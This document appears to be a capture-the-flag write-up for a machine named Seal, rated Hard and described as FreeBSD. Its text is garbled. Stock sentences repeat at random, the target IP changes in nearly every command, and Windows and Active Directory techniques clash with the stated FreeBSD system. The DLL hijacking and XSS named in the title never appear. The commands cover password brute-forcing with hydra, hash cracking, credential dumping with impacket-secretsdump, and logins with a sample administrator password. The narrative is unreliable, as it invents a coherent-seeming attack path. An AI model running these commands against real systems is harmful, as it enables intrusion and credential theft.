---
TitleSEO: "PwnTillDawn — Seal (Hard FreeBSD) | ZureFX"
TitlePost: "PwnTillDawn — Seal (Hard FreeBSD)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Seal. DLL Hijacking and XSS to achieve hard compromise on FreeBSD."
Keywords: "offsec, hackthebox, hard, tryhackme, reversing, web, pwntilldawn"
URL: "https://zurefx.github.io/writeups/htb-seal-934.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-seal-934/"
Date: "2024-08-13"
Tags: "OffSec, HackTheBox, Hard, TryHackMe, Reversing, Web, PwnTillDawn"
Section: "writeups"
Lang: "en"
main_img: "htb-seal-934"
Permalink: "/writeups/htb-seal-934.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Seal** is rated **Hard** on PwnTillDawn. It runs **FreeBSD** and the IP address during this analysis was `10.124.67.19`.

### Objectives

Unconstrained delegation was enabled on the compromised machine. The service account had excessive permissions assigned in Active Directory.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
nmap -sCV -p587,143,9200 10.47.251.203 -oN scan.txt
```

Command injection was possible through unsanitized user input in the search functionality. Weak file permissions allowed modification of critical system files.

### Service Enumeration

Lateral movement was facilitated by reusing discovered credentials across services. The kernel version was outdated and vulnerable to a publicly known exploit. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.43.128.238/FUZZ
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p25,80,23 10.71.239.231 -oN scan.txt
```

Group Policy Preferences contained encrypted but recoverable credentials. Authentication bypass was achieved through careful manipulation of the login mechanism.

### Web Enumeration

The web application was vulnerable to Server-Side Template Injection (SSTI). Unconstrained delegation was enabled on the compromised machine.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.65.107.13/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.116.100.35/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.52.43.65/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.45.19.121/FUZZ
```

The backup files contained sensitive information that should not have been accessible. Initial enumeration revealed several interesting open ports on the target. Command injection was possible through unsanitized user input in the search functionality.

## Exploitation

### Vulnerability Identification

The backup files contained sensitive information that should not have been accessible. The web application was vulnerable to Server-Side Template Injection (SSTI). The kernel version was outdated and vulnerable to a publicly known exploit.

Key finding: **DLL Hijacking**.

The web application was vulnerable to Server-Side Template Injection (SSTI). Post-exploitation enumeration revealed a path to domain administrator privileges.

### Initial Access

Weak file permissions allowed modification of critical system files. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
crackmapexec smb 10.25.176.178 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.100.112.195/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
evil-winrm -i 10.114.56.200 -u administrator -p 'P@ssw0rd!'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The scheduled task ran with elevated privileges and could be abused for escalation. Unconstrained delegation was enabled on the compromised machine. Token impersonation allowed elevation to SYSTEM privileges on the target.

## Privilege Escalation

### Enumeration

Privilege escalation was possible due to misconfigured sudo permissions. Authentication bypass was achieved through careful manipulation of the login mechanism. Lateral movement was facilitated by reusing discovered credentials across services.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.39.115.145
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.32.172.241 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.121.12.55 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Exploitation

Lateral movement was facilitated by reusing discovered credentials across services. Initial enumeration revealed several interesting open ports on the target.

```powershell
feroxbuster -h
```

Unconstrained delegation was enabled on the compromised machine. Unconstrained delegation was enabled on the compromised machine.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The service was running without proper input validation, leading to injection vulnerabilities. The application stored sensitive credentials in an unencrypted configuration file.

## Summary

### Tools Used

- `psexec`
- `sqlmap`
- `smbclient`
- `kerbrute`
- `sharphound`

### Key Takeaways

- DLL Hijacking
- XSS
- Path Traversal
- CSRF
